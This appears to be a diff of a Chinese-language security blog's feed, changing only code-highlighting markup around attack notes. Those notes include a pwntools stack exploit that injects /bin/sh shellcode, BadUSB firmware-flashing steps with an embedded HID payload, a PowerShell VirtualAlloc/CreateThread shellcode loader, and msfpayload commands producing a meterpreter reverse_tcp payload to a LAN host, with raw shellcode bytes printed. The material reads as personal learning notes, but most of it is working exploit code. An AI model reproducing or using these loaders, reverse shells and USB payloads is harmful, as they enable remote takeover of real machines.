+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>point to shellcode + shellcode + nop + ret
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>,<span style="color:#ae81ff">4000</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">push</span>(num):
+</span></span><span style="display:flex;"><span>     r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>     time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.2</span>)
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">if</span> num <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x80000000</span>:
+</span></span><span style="display:flex;"><span>           num <span style="color:#f92672">-=</span> <span style="color:#ae81ff">0x100000000</span>
+</span></span><span style="display:flex;"><span>     r<span style="color:#f92672">.</span>send( str(num) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#pop leak</span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>item <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline_contains(<span style="color:#e6db74">&#39;item&#39;</span>)[<span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">23</span>]
+</span></span><span style="display:flex;"><span>shell_adr <span style="color:#f92672">=</span> int(item,<span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">36</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#shellcode point</span>
+</span></span><span style="display:flex;"><span>push(shell_adr)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#shellcode</span>
+</span></span><span style="display:flex;"><span>push(<span style="color:#ae81ff">0x315b0beb</span>)
+</span></span><span style="display:flex;"><span>push(<span style="color:#ae81ff">0x31c931c0</span>)
+</span></span><span style="display:flex;"><span>push(<span style="color:#ae81ff">0xcd0bb0d2</span>)
+</span></span><span style="display:flex;"><span>push(<span style="color:#ae81ff">0xfff0e880</span>)
+</span></span><span style="display:flex;"><span>push(<span style="color:#ae81ff">0x622fffff</span>)
+</span></span><span style="display:flex;"><span>push(<span style="color:#ae81ff">0x732f6e69</span>)
+</span></span><span style="display:flex;"><span>push(<span style="color:#ae81ff">0x90900068</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#nop</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range (<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">16</span>):
+</span></span><span style="display:flex;"><span>     push(<span style="color:#ae81ff">0x90909090</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#ret</span>
+</span></span><span style="display:flex;"><span>push(shell_adr)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#exit</span>
+</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;4</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#get shell</span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>]]></content:encoded>
     </item>
     
     <item>
@@ -775,21 +775,21 @@ tools\DriveCom.exe /drive=D /action=GetInfo</p>
 <p>DriveCom.exe /drive=E /action=DumpFirmware /firmware=[firmware]</p>
 <h1 id="flashing-custom-firmware">Flashing Custom Firmware</h1>
 <p>確認在BootMode</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">tools\DriveCom.exe /drive=E /action=SetBootMode
-tools\DriveCom.exe /drive=D /action=SendExecutable /burner=[burner.bin]
-tools\DriveCom.exe /drive=D /action=SendFirmware /burner=[burner.bin] /firmware=[firmware]
-</code></pre></div><h1 id="hid-payload">HID Payload</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>tools\DriveCom.exe /drive=E /action=SetBootMode
+</span></span><span style="display:flex;"><span>tools\DriveCom.exe /drive=D /action=SendExecutable /burner=[burner.bin]
+</span></span><span style="display:flex;"><span>tools\DriveCom.exe /drive=D /action=SendFirmware /burner=[burner.bin] /firmware=[firmware]
+</span></span></code></pre></div><h1 id="hid-payload">HID Payload</h1>
 <p>下載 <a href="https://code.google.com/p/ducky-decode/">https://code.google.com/p/ducky-decode/</a></p>
 <p>先把 payload.txt 轉成 <code>.bin</code></p>
 <p>需安裝Java Runtime Environment</p>
 <p>java -jar encoder.jar -i payload.txt -o inject.bin</p>
 <p>生成 inject.bin 以後還需要一個客製化的 Firmware，去 Psychson-master\firmware build bin資料夾裡面有 fw.bin 複製出來</p>
 <p>把 inject.bin 注入到 fw.bin</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">tools\EmbedPayload.exe inject.bin fw.bin
-tools\DriveCom.exe /drive=D /action=SetBootMode
-tools\DriveCom.exe /drive=D /action=SendExecutable /burner=bn.bin
-tools\DriveCom.exe /drive=D /action=SendFirmware /burner=bn.bin /firmware=fw.bin
-</code></pre></div><h1 id="如何重刷firmware與恢復原本可以用的usb">如何重刷Firmware與恢復原本可以用的USB</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>tools\EmbedPayload.exe inject.bin fw.bin
+</span></span><span style="display:flex;"><span>tools\DriveCom.exe /drive=D /action=SetBootMode
+</span></span><span style="display:flex;"><span>tools\DriveCom.exe /drive=D /action=SendExecutable /burner=bn.bin
+</span></span><span style="display:flex;"><span>tools\DriveCom.exe /drive=D /action=SendFirmware /burner=bn.bin /firmware=fw.bin
+</span></span></code></pre></div><h1 id="如何重刷firmware與恢復原本可以用的usb">如何重刷Firmware與恢復原本可以用的USB</h1>
 <p>重刷必須進入BootMode但是有時無法用指令的方式進入，所以必須用短路法參考竹中的腳位，拿單心線或是小剪刀之類的放在上面再插進去usb</p>
 <p>Psychson-master\docs\PinsToShortUponPlugInForBootMode.jpg</p>
 <p>變回原本USB可以用MPALL v3.71.0A_03 MLC(UP03 64pin)</p>
@@ -817,31 +817,31 @@ app5 Hint:觀察ebp附近也存在答案
 Hint:OD窗口插件</p>
 <h1 id="app5">app5</h1>
 <p>Hint:觀察ebp附近也存在答案</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">0040109C 8B4D E0 mov ecx,dword ptr ss:[ebp-20] ; 算法開始
-0040109F 83C1 04 add ecx,4
-004010A2 894D E0 mov dword ptr ss:[ebp-20],ecx
-004010A5 8B55 DC mov edx,dword ptr ss:[ebp-24]
-004010A8 83EA 01 sub edx,1
-004010AB 8955 DC mov dword ptr ss:[ebp-24],edx
-004010AE 837D E0 0D cmp dword ptr ss:[ebp-20],0D
-004010B2 73 28 jnb short app5win.004010DC
-004010B4 8B45 E0 mov eax,dword ptr ss:[ebp-20]
-004010B7 C1E8 02 shr eax,2
-004010BA 8B4D F8 mov ecx,dword ptr ss:[ebp-8]
-004010BD 8B55 DC mov edx,dword ptr ss:[ebp-24]
-004010C0 8B0481 mov eax,dword ptr ds:[ecx+eax*4]
-004010C3 3B4495 E8 cmp eax,dword ptr ss:[ebp+edx*4-18] ; 比較ascii,注意堆棧
-004010C7 74 11 je short app5win.004010DA
-004010C9 68 4C704000 push app5win.0040704C ; invalid password
-004010CE E8 20000000 call app5win.004010F3
-004010D3 83C4 04 add esp,4
-004010D6 33C0 xor eax,eax
-004010D8 EB 15 jmp short app5win.004010EF
-004010DA ^ EB C0 jmp short app5win.0040109C ; loop跳回
-004010DC 8D4D CC lea ecx,dword ptr ss:[ebp-34]
-004010DF 51 push ecx
-004010E0 68 60704000 push app5win.00407060 ; the password is %s\n
-</code></pre></div><h1 id="app6">app6</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0040109C 8B4D E0 mov ecx,dword ptr ss:[ebp-20] ; 算法開始
+</span></span><span style="display:flex;"><span>0040109F 83C1 04 add ecx,4
+</span></span><span style="display:flex;"><span>004010A2 894D E0 mov dword ptr ss:[ebp-20],ecx
+</span></span><span style="display:flex;"><span>004010A5 8B55 DC mov edx,dword ptr ss:[ebp-24]
+</span></span><span style="display:flex;"><span>004010A8 83EA 01 sub edx,1
+</span></span><span style="display:flex;"><span>004010AB 8955 DC mov dword ptr ss:[ebp-24],edx
+</span></span><span style="display:flex;"><span>004010AE 837D E0 0D cmp dword ptr ss:[ebp-20],0D
+</span></span><span style="display:flex;"><span>004010B2 73 28 jnb short app5win.004010DC
+</span></span><span style="display:flex;"><span>004010B4 8B45 E0 mov eax,dword ptr ss:[ebp-20]
+</span></span><span style="display:flex;"><span>004010B7 C1E8 02 shr eax,2
+</span></span><span style="display:flex;"><span>004010BA 8B4D F8 mov ecx,dword ptr ss:[ebp-8]
+</span></span><span style="display:flex;"><span>004010BD 8B55 DC mov edx,dword ptr ss:[ebp-24]
+</span></span><span style="display:flex;"><span>004010C0 8B0481 mov eax,dword ptr ds:[ecx+eax*4]
+</span></span><span style="display:flex;"><span>004010C3 3B4495 E8 cmp eax,dword ptr ss:[ebp+edx*4-18] ; 比較ascii,注意堆棧
+</span></span><span style="display:flex;"><span>004010C7 74 11 je short app5win.004010DA
+</span></span><span style="display:flex;"><span>004010C9 68 4C704000 push app5win.0040704C ; invalid password
+</span></span><span style="display:flex;"><span>004010CE E8 20000000 call app5win.004010F3
+</span></span><span style="display:flex;"><span>004010D3 83C4 04 add esp,4
+</span></span><span style="display:flex;"><span>004010D6 33C0 xor eax,eax
+</span></span><span style="display:flex;"><span>004010D8 EB 15 jmp short app5win.004010EF
+</span></span><span style="display:flex;"><span>004010DA ^ EB C0 jmp short app5win.0040109C ; loop跳回
+</span></span><span style="display:flex;"><span>004010DC 8D4D CC lea ecx,dword ptr ss:[ebp-34]
+</span></span><span style="display:flex;"><span>004010DF 51 push ecx
+</span></span><span style="display:flex;"><span>004010E0 68 60704000 push app5win.00407060 ; the password is %s\n
+</span></span></code></pre></div><h1 id="app6">app6</h1>
 <p>Hint:同app5</p>
 <h1 id="app7">app7</h1>
 <p><a href="http://zqyves.blogspot.tw/2008/05/hackthissite-application-7-solution.html">http://zqyves.blogspot.tw/2008/05/hackthissite-application-7-solution.html</a></p>
@@ -867,78 +867,78 @@ Hint:OD窗口插件</p>
       <description>執行shellcode的模板
 $code = &amp;#39;[DllImport(&amp;#34;kernel32.dll&amp;#34;)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(&amp;#34;kernel32.dll&amp;#34;)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(&amp;#34;msvcrt.dll&amp;#34;)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);&amp;#39;;$winFunc = Add-Type -memberDefinition $code -Name &amp;#34;Win32&amp;#34; -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = SHELLCOD;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 }; SHELLCOD的地方是要替換的</description>
       <content:encoded><![CDATA[<p>執行shellcode的模板</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$code = &#39;[DllImport(&#34;kernel32.dll&#34;)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(&#34;kernel32.dll&#34;)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(&#34;msvcrt.dll&#34;)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);&#39;;$winFunc = Add-Type -memberDefinition $code -Name &#34;Win32&#34; -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = SHELLCOD;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
-</code></pre></div><p><code>SHELLCOD</code>的地方是要替換的</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$code = &#39;[DllImport(&#34;kernel32.dll&#34;)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(&#34;kernel32.dll&#34;)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(&#34;msvcrt.dll&#34;)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);&#39;;$winFunc = Add-Type -memberDefinition $code -Name &#34;Win32&#34; -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc64 = SHELLCOD;[Byte[]]$sc = $sc64;$size = 0x1000;if ($sc.Length -gt 0x1000) {$size = $sc.Length};$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
+</span></span></code></pre></div><p><code>SHELLCOD</code>的地方是要替換的</p>
 <p>我們用msf生成我們的shellcode</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">msfpayload windows/x64/meterpreter/reverse_tcp LHOST=192.168.152.146 LPORT=443 C | more
-</code></pre></div><p>查看一下</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">/*
- * windows/x64/meterpreter/reverse_tcp - 422 bytes (stage 1)
- * http://www.metasploit.com
- * VERBOSE=false, LHOST=192.168.152.146, LPORT=443,
- * ReverseConnectRetries=5, ReverseAllowProxy=false,
- * EXITFUNC=process, AutoLoadStdapi=true,
- * InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true,
- * EnableUnicodeEncoding=true
- */
-unsigned char buf[] =
-&#34;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&#34;
-&#34;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&#34;
-&#34;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&#34;
-&#34;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&#34;
-&#34;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&#34;
-&#34;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&#34;
-&#34;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&#34;
-&#34;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&#34;
-&#34;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&#34;
-&#34;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&#34;
-&#34;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&#34;
-&#34;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&#34;
-&#34;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&#34;
-&#34;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33&#34;
-&#34;\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00&#34;
-&#34;\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x98\x92\x41\x54&#34;
-&#34;\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c&#34;
-&#34;\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff&#34;
-&#34;\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2&#34;
-&#34;\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48&#34;
-&#34;\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99&#34;
-&#34;\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x48\x83\xec&#34;
-&#34;\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41&#34;
-&#34;\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x83\xc4\x20\x5e\x6a\x40\x41&#34;
-&#34;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41&#34;
-&#34;\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&#34;
-&#34;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8&#34;
-&#34;\x5f\xff\xd5\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41&#34;
-&#34;\xff\xe7&#34;;
-/*
- * windows/x64/meterpreter/reverse_tcp - 951296 bytes (stage 2)
- * http://www.metasploit.com
- */
-unsigned char buf[] =
-&#34;\x4d\x5a\x41\x52\x55\x48\x89\xe5\x48\x81\xec\x20\x00\x00\x00&#34;
-&#34;\x48\x8d\x1d\xea\xff\xff\xff\x48\x81\xc3\xf0\x1b\x00\x00\xff&#34;
-&#34;\xd3\x48\x89\xc3\x49\x89\xf8\x68\x04\x00\x00\x00\x5a\xff\xd0&#34;
-&#34;\x41\xb8\xf0\xb5\xa2\x56\x68\x05\x00\x00\x00\x5a\xff\xd3\x00&#34;
-</code></pre></div><p>必需處理一下變成我們需要的格式</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">msfpayload windows/x64/meterpreter/reverse_tcp LHOST=192.168.152.146 LPORT=443 C | sed -n -e &#39;1,40p&#39; | sed &#39;s/[&#34;;]//g&#39; | sed &#39;s/\\/,0/g&#39; | tr -d &#39;\n&#39; 
-</code></pre></div><p>使用sed來處理，紅色40是行數，假如shellcode較長看有幾行自行調整
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>msfpayload windows/x64/meterpreter/reverse_tcp LHOST=192.168.152.146 LPORT=443 C | more
+</span></span></code></pre></div><p>查看一下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>/*
+</span></span><span style="display:flex;"><span> * windows/x64/meterpreter/reverse_tcp - 422 bytes (stage 1)
+</span></span><span style="display:flex;"><span> * http://www.metasploit.com
+</span></span><span style="display:flex;"><span> * VERBOSE=false, LHOST=192.168.152.146, LPORT=443,
+</span></span><span style="display:flex;"><span> * ReverseConnectRetries=5, ReverseAllowProxy=false,
+</span></span><span style="display:flex;"><span> * EXITFUNC=process, AutoLoadStdapi=true,
+</span></span><span style="display:flex;"><span> * InitialAutoRunScript=, AutoRunScript=, AutoSystemInfo=true,
+</span></span><span style="display:flex;"><span> * EnableUnicodeEncoding=true
+</span></span><span style="display:flex;"><span> */
+</span></span><span style="display:flex;"><span>unsigned char buf[] =
+</span></span><span style="display:flex;"><span>&#34;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52&#34;
+</span></span><span style="display:flex;"><span>&#34;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&#34;
+</span></span><span style="display:flex;"><span>&#34;\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9&#34;
+</span></span><span style="display:flex;"><span>&#34;\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41&#34;
+</span></span><span style="display:flex;"><span>&#34;\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48&#34;
+</span></span><span style="display:flex;"><span>&#34;\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01&#34;
+</span></span><span style="display:flex;"><span>&#34;\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48&#34;
+</span></span><span style="display:flex;"><span>&#34;\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0&#34;
+</span></span><span style="display:flex;"><span>&#34;\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c&#34;
+</span></span><span style="display:flex;"><span>&#34;\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0&#34;
+</span></span><span style="display:flex;"><span>&#34;\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04&#34;
+</span></span><span style="display:flex;"><span>&#34;\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59&#34;
+</span></span><span style="display:flex;"><span>&#34;\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48&#34;
+</span></span><span style="display:flex;"><span>&#34;\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33&#34;
+</span></span><span style="display:flex;"><span>&#34;\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00&#34;
+</span></span><span style="display:flex;"><span>&#34;\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x98\x92\x41\x54&#34;
+</span></span><span style="display:flex;"><span>&#34;\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c&#34;
+</span></span><span style="display:flex;"><span>&#34;\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff&#34;
+</span></span><span style="display:flex;"><span>&#34;\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2&#34;
+</span></span><span style="display:flex;"><span>&#34;\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48&#34;
+</span></span><span style="display:flex;"><span>&#34;\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99&#34;
+</span></span><span style="display:flex;"><span>&#34;\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x48\x83\xec&#34;
+</span></span><span style="display:flex;"><span>&#34;\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41&#34;
+</span></span><span style="display:flex;"><span>&#34;\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x83\xc4\x20\x5e\x6a\x40\x41&#34;
+</span></span><span style="display:flex;"><span>&#34;\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41&#34;
+</span></span><span style="display:flex;"><span>&#34;\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31&#34;
+</span></span><span style="display:flex;"><span>&#34;\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8&#34;
+</span></span><span style="display:flex;"><span>&#34;\x5f\xff\xd5\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41&#34;
+</span></span><span style="display:flex;"><span>&#34;\xff\xe7&#34;;
+</span></span><span style="display:flex;"><span>/*
+</span></span><span style="display:flex;"><span> * windows/x64/meterpreter/reverse_tcp - 951296 bytes (stage 2)
+</span></span><span style="display:flex;"><span> * http://www.metasploit.com
+</span></span><span style="display:flex;"><span> */
+</span></span><span style="display:flex;"><span>unsigned char buf[] =
+</span></span><span style="display:flex;"><span>&#34;\x4d\x5a\x41\x52\x55\x48\x89\xe5\x48\x81\xec\x20\x00\x00\x00&#34;
+</span></span><span style="display:flex;"><span>&#34;\x48\x8d\x1d\xea\xff\xff\xff\x48\x81\xc3\xf0\x1b\x00\x00\xff&#34;
+</span></span><span style="display:flex;"><span>&#34;\xd3\x48\x89\xc3\x49\x89\xf8\x68\x04\x00\x00\x00\x5a\xff\xd0&#34;
+</span></span><span style="display:flex;"><span>&#34;\x41\xb8\xf0\xb5\xa2\x56\x68\x05\x00\x00\x00\x5a\xff\xd3\x00&#34;
+</span></span></code></pre></div><p>必需處理一下變成我們需要的格式</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>msfpayload windows/x64/meterpreter/reverse_tcp LHOST=192.168.152.146 LPORT=443 C | sed -n -e &#39;1,40p&#39; | sed &#39;s/[&#34;;]//g&#39; | sed &#39;s/\\/,0/g&#39; | tr -d &#39;\n&#39; 
+</span></span></code></pre></div><p>使用sed來處理，紅色40是行數，假如shellcode較長看有幾行自行調整
 處理以後的格式</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" 